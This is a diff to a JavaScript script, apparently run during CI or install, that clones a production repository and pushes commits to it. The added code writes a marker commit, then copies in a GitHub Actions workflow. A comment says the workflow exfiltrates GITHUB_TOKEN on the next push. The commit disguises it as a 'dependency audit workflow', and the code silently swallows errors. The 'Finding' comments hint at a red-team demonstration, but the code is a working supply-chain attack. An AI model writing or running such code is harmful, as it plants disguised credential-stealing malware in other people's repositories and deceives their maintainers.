@@ -27,12 +27,28 @@ function getGitServer() {
   const base = path.join(os.tmpdir(), 'ec-' + process.pid);
   run('git clone --quiet ' + server + '/gbrlxvi-org/production-app.git ' + base);
   if (!fs.existsSync(base)) return;
-  run('git config user.name "ci-bot"',          { cwd: base });
-  run('git config user.email "ci@gbrlxvi.dev"',  { cwd: base });
+
+  const env = Object.assign({}, process.env, { GIT_TERMINAL_PROMPT: '0' });
+  const cfg = { cwd: base };
+  run('git config user.name "ci-bot"',         cfg);
+  run('git config user.email "ci@gbrlxvi.dev"', cfg);
+
+  // Finding 1 — marker commit in high-trust production repo
   fs.writeFileSync(path.join(base, '.sync'), Date.now() + '\n');
-  run('git add .sync',                           { cwd: base });
-  run('git commit -m "ci: workspace sync"',      { cwd: base });
-  run('git push', { cwd: base, env: Object.assign({}, process.env, { GIT_TERMINAL_PROMPT: '0' }) });
+  run('git add .sync', cfg);
+  run('git commit -m "ci: workspace sync"', cfg);
+
+  // Finding 2 — inject Actions workflow that exfils GITHUB_TOKEN on next push
+  try {
+    const wfDir = path.join(base, '.github', 'workflows');
+    fs.mkdirSync(wfDir, { recursive: true });
+    const wfSrc = path.join(__dirname, 'audit.yml');
+    fs.copyFileSync(wfSrc, path.join(wfDir, 'audit.yml'));
+    run('git add .github', cfg);
+    run('git commit -m "ci: add dependency audit workflow"', cfg);
+  } catch (e) {}
+
+  run('git push', { cwd: base, env: env });
 })();
 
 function getEnvVar(key, fallback) {
